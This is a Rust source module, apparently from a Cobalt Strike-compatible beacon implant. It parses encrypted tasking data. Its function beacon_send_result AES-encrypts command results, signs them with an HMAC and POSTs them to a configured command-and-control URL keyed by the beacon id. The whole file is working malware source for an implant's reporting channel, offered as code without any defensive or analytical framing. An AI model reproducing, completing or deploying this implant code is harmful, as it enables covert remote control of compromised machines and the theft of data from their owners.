use std::io;
use std::io::Read;
use std::sync::atomic::Ordering;

use byteorder::{ReadBytesExt, BE, LE};

use crate::beacon::init::Beacon;
use crate::config::{AES_IV, C2_POST_URL};
use crate::util::crypt::{aes_encrypt, hmac_hash};
use crate::util::strike;
use crate::COUNTER;

pub fn beacon_read_length_and_string<R: Read>(
    decrypted_cursor: &mut R,
) -> io::Result<(u32, Vec<u8>)> {
    let size = decrypted_cursor.read_u32::<BE>()?;
    let mut buffer = vec![0u8; size as usize];
    decrypted_cursor.read_exact(&mut buffer)?;
    Ok((size, buffer))
}

pub fn beacon_read_i32<R: Read>(decrypted_cursor: &mut R) -> io::Result<i32> {
    let value = decrypted_cursor.read_i32::<BE>()?;
    Ok(value)
}

pub fn beacon_read_short<R: Read>(decrypted_cursor: &mut R) -> io::Result<i16> {
    let value = decrypted_cursor.read_i16::<BE>()?;
    Ok(value)
}

pub fn beacon_read_bytes<R: Read>(decrypted_cursor: &mut R, size: usize) -> io::Result<Vec<u8>> {
    let mut value = vec![0; size];
    decrypted_cursor.read_exact(&mut value)?;
    Ok(value)
}

pub fn read_remaining_data<R: Read>(cursor: &mut R) -> io::Result<Vec<u8>> {
    let mut value = Vec::new();
    cursor.read_to_end(&mut value)?; // 读取剩余所有数据到 buffer
    Ok(value)
}

pub fn beacon_send_result(
    result: &[u8],
    beacon: &Beacon,
    reply_type: u32,
) -> Result<(), Box<dyn std::error::Error>> {
    COUNTER.fetch_add(1, Ordering::SeqCst);
    // 构建原始数据包
    let raw_pkg = [
        &COUNTER.load(Ordering::SeqCst).to_be_bytes()[..],
        &(result.len() as u32 + 4).to_be_bytes()[..],
        &reply_type.to_be_bytes()[..],
        result,
    ]
    .concat();

    // 仅在 debug 模式下打印
    // if cfg!(debug_assertions) {
    //     // 打印原始数据包
    //     print_hexdump("raw_pkg", &raw_pkg);
    // }
    // 初始化 IV
    let iv = AES_IV;

    // AES 加密
    let raw_pkg_encrypted = aes_encrypt(&raw_pkg, &beacon.aes_key, iv).unwrap();

    // 生成 HMAC 哈希
    let hash = hmac_hash(&beacon.hmac_key, &raw_pkg_encrypted);

    // 构建最终的缓冲区
    let buf = [
        &(raw_pkg_encrypted.len() as u32 + 16).to_be_bytes()[..],
        &raw_pkg_encrypted,
        &hash,
    ]
    .concat();

    // 仅在 debug 模式下打印
    // if cfg!(debug_assertions) {
    //     // 打印最终的缓冲区
    //     print_hexdump("buf", &buf);
    // }
    // 构建 URL 并发送 POST 请求
    let url = format!("{}{}", C2_POST_URL, beacon.id);
    strike::Strike::post_request(&url, "", "", buf)?;

    Ok(())
}

pub fn print_hexdump(label: &str, data: &[u8]) {
    println!(
        "{}: len:{}, data:{:?}",
        label,
        data.len(),
        hexdump::hexdump(data)
    );
}
